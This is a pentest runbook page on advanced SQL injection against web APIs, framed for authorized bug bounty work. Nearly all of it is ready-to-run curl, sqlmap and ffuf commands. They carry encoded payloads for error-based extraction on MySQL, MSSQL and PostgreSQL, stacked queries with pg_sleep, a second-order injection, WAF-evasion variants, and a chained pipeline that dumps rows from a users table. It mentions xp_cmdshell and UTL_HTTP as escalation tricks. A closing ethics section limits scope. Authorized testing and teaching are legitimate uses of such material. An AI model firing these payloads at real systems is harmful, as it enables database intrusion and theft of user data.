---
title: "SQL Injection — Advanced Techniques"
description: "Second-order, error-based, and stacked-query SQLi with database-specific tricks and chained WAF evasion."
phase: Web
order: 74
tags:
  - sqli
  - database
  - injection
  - bypass
tools:
  - sqlmap
  - curl
  - ffuf
updated: 2026-10-01
---

An advanced SQL injection runbook for bug bounty / authorized pentest on **in-scope** targets only. Goal: extract proof-of-access data when output is filtered, timing is noisy, or a WAF sits in front, building on a confirmed injection point.

## 1. Confirm and fingerprint

```bash
sqlmap -u "https://target.com/api/item?id=1" --batch --level 2 --risk 1 --threads 1
curl -s "https://target.com/api/item?id=1%27"
curl -s "https://target.com/api/item?id=1%20AND%201=1" -o /dev/null -w '%{size_download}\n'
curl -s "https://target.com/api/item?id=1%20AND%201=2" -o /dev/null -w '%{size_download}\n'
```

## 2. Second-order injection

Store a payload now, trigger it later in a different query.

```bash
curl -s -X POST "https://target.com/api/profile" \
  -H "Cookie: session=$SESSION" -H "Content-Type: application/json" \
  -d "{\"username\":\"admin'--\"}"
curl -s "https://target.com/api/reports/summary" -H "Cookie: session=$SESSION"
```

## 3. Error-based extraction

```bash
# MySQL
curl -s "https://target.com/api/item?id=1%27%20AND%20extractvalue(1,concat(0x7e,(SELECT%20version())))--%20-"
# MSSQL
curl -s "https://target.com/api/item?id=1%27%20AND%201=CONVERT(int,(SELECT%20TOP%201%20name%20FROM%20users))--%20-"
# PostgreSQL
curl -s "https://target.com/api/item?id=1%27%20AND%201=CAST((SELECT%20version())%20AS%20int)--%20-"
```

## 4. Stacked queries and DB-specific tricks

```bash
curl -s "https://target.com/api/item?id=1%27;%20SELECT%20pg_sleep(5)--%20-"
sqlmap -u "https://target.com/api/item?id=1" --batch --dbms=postgresql \
  --stacked-queries --technique=S --threads 1
```

DB shortcuts: MySQL `information_schema`/`GROUP_CONCAT`; PostgreSQL `pg_catalog`/`COPY`; MSSQL `OPENROWSET`/`xp_cmdshell`; Oracle `UTL_HTTP`/dual.

## 5. Filter and WAF evasion chains

```bash
curl -s "https://target.com/api/item?id=1/**/UNION/**/SELECT/**/1,2,3"
curl -s "https://target.com/api/item?id=1%2527"
curl -s "https://target.com/api/item?id=1%27%20/*!50000UNION*/%20/*!50000SELECT*/%201,2,3"
ffuf -u "https://target.com/api/item?id=FUZZ" -w sqli.txt -mc all -fs 0
```

## 6. Optimize blind extraction

```bash
sqlmap -u "https://target.com/api/item?id=1" --batch --technique=B \
  --level 2 --risk 1 --threads 1 --dump -T users --where="id=1" --stop 1
```

Prefer boolean over time-based; cap requests and limit dumps to a single proof row.

## Full pipeline

```bash
B="https://target.com/api/item"
sqlmap -u "$B?id=1" --batch --level 2 --risk 1 --threads 1
curl -s "$B?id=1%20AND%201=1" -o /dev/null -w 'true:  %{size_download}\n'
curl -s "$B?id=1%20AND%201=2" -o /dev/null -w 'false: %{size_download}\n'
curl -s -X POST "https://target.com/api/profile" \
  -H "Cookie: session=$SESSION" -H "Content-Type: application/json" \
  -d "{\"username\":\"admin'--\"}"
curl -s "https://target.com/api/reports/summary" -H "Cookie: session=$SESSION"
curl -s "$B?id=1%27%20AND%20extractvalue(1,concat(0x7e,(SELECT%20version())))--%20-"
curl -s "$B?id=1%27%20/*!50000UNION*/%20/*!50000SELECT*/%201,2,3"
sqlmap -u "$B?id=1" --batch --level 2 --risk 1 --threads 1 \
  --technique=B --dump -T users --where="id=1" --stop 1
```

## Ethics & legality

- Only test injection on targets and parameters within the authorized scope.
- Never issue destructive statements (`DROP`, `DELETE`, `UPDATE`) or use `xp_cmdshell` unless explicitly authorized.
- Extract only the minimum proof row; do not dump user tables wholesale.
- Keep sqlmap risk/level low and add delays so you do not degrade the service.
